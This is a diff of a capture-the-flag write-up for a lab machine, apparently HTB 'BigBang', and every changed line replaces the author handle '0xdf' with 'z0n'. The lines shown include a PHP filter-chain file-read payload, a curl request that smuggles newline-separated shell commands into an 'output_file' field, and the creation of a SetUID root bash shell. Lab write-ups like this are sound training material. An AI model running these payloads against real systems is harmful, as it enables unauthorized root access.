@@ -21,7 +21,7 @@ Hints: True
 | 7    | `developer`   | **APK Exfiltration and Reversing**             | Located `satellite-app.apk` in `developer`’s home directory. Downloaded APK for analysis using jadx-gui. Identified hardcoded endpoints and authentication flows: `/login` and `/command`. |
 | 8    | `developer`   | **API Authentication**                         | Reproduced the login request to `/login` endpoint and retrieved a valid Bearer token for API use.                                                                                          |
 | 9    | `developer`   | **Command Injection via Newline**              | Identified that `output_file` parameter was vulnerable to newline injection. Successfully injected commands (e.g., `ping`) and confirmed network control.                                  |
-| 10   | `root`        | **Privilege Escalation via Command Injection** | Executed a command injection to create a SetUID root bash shell: <br>`cp /bin/bash /tmp/0xdf` <br>`chmod 6777 /tmp/0xdf`. Used `/tmp/0xdf -p` to obtain an interactive root shell.         |
+| 10   | `root`        | **Privilege Escalation via Command Injection** | Executed a command injection to create a SetUID root bash shell: <br>`cp /bin/bash /tmp/z0n` <br>`chmod 6777 /tmp/z0n`. Used `/tmp/z0n -p` to obtain an interactive root shell.         |
 | 11   | `root`        | **Root Flag Retrieval**                        | Located and read the root flag: <br>`cat /root/root.txt` → <br>`c3065984************************`.                                                                       
 
 
@@ -777,7 +777,7 @@ I think the last six characters (five missing in hostname plus trailing newline)
 To test this, I’ll re-run wrapwrap with a longer prefix:
 
 ```bash
-(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] python wrapwrap.py /etc/hosts "GIF89a0xdf" "" 1000
+(myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] python wrapwrap.py /etc/hosts "GIF89az0n" "" 1000
 [!] Ignoring nb_bytes value since there is no suffix  
 [+] Wrote filter chain to chain.txt (size=2619).
 ```
@@ -788,11 +788,11 @@ Chain contents:
 php://filter/convert.base64-encode|...|convert.base64-decode/resource=/etc/hosts
 ```
 
-After sending that, the resulting image has six more characters of prefix (not exactly sure why “MM” was added after “0xdf”, but filters are weird), and six less characters of the file:
+After sending that, the resulting image has six more characters of prefix (not exactly sure why “MM” was added after “z0n”, but filters are weird), and six less characters of the file:
 
 ```bash
 (myenv)─(xpl0riz0n__XPl0RIz0n)-[~/ctf_OpenVPN] curl http://blog.bigbang.htb/wp-content/uploads/2025/01/1-8.png -o-
-GIF89a0xdfMM127.0.0.1   localhost
+GIF89az0nMM127.0.0.1   localhost
 ::1     localhost ip6-localhost ip6-loopback
 fe00::0 ip6-localnet
 ff00::0 ip6-mcastprefix
@@ -1254,7 +1254,7 @@ Attempted login with wrong creds:
 
 ```bash
 $ curl app.bigbang.htb:9090/login \
-  -d '{"username": "0xdf", "password": "0xdf"}' \
+  -d '{"username": "z0n", "password": "z0n"}' \
   -H "Content-Type: application/json"
 {"error":"Bad username or password"}
 ```
@@ -1373,17 +1373,17 @@ Injected commands to copy bash and set it as SetUID:
 
 ```bash
 $ curl app.bigbang.htb:9090/command \
-  -d '{"command": "send_image", "output_file": "test.png\ncp /bin/bash /tmp/0xdf\nchmod 6777 /tmp/0xdf"}' \
+  -d '{"command": "send_image", "output_file": "test.png\ncp /bin/bash /tmp/z0n\nchmod 6777 /tmp/z0n"}' \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer $token"
-{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\ncp /bin/bash /tmp/0xdf\\nchmod 6777 /tmp/0xdf'"}
+{"error":"Error reading image file: [Errno 2] No such file or directory: 'test.png\\ncp /bin/bash /tmp/z0n\\nchmod 6777 /tmp/z0n'"}
 ```
 
 Spawned a root shell:
 
 ```bash
-$ /tmp/0xdf -p
-0xdf-5.1#
+$ /tmp/z0n -p
+z0n-5.1#
 ```
 
 Retrieved root flag:
